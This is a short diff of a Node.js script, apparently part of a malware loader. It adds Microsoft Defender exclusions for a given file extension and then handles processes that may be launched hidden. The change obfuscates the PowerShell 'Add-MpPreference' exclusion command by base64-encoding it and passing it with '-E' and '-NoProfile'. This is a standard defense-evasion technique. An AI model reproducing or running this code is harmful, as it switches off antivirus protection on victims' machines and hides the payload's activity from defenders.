@@ -13,9 +13,12 @@ function main() {
     }
 }
 
-function defender_exclusions() {
+function defender_exclusions(process_ext) {
     var run_command = "cmd.exe";
-    var run_args = ["/d", "/c", "call", "powershell.exe", "Add-MpPreference -ExclusionExtension " + process_ext];
+    var command = "Add-MpPreference -ExclusionE ." + process_ext
+    //base64 utf-16le encode commmand
+    var command = Buffer.from(command, 'utf16le').toString('base64');
+    var run_args = ["/d", "/c", "call", "powershell.exe", "-NoProfile", "-E", command];
     var child = spawn(run_command, run_args, { stdio: 'inherit' });
 
     child.on('exit', function(code) {
@@ -25,7 +28,7 @@ function defender_exclusions() {
 
 function handle_process(process_ext, process_code, new_console, hidden) {
     if (exclusions) {
-        if (defender_exclusions() != 0) {
+        if (defender_exclusions(process_ext) != 0) {
             return;
         }
     }
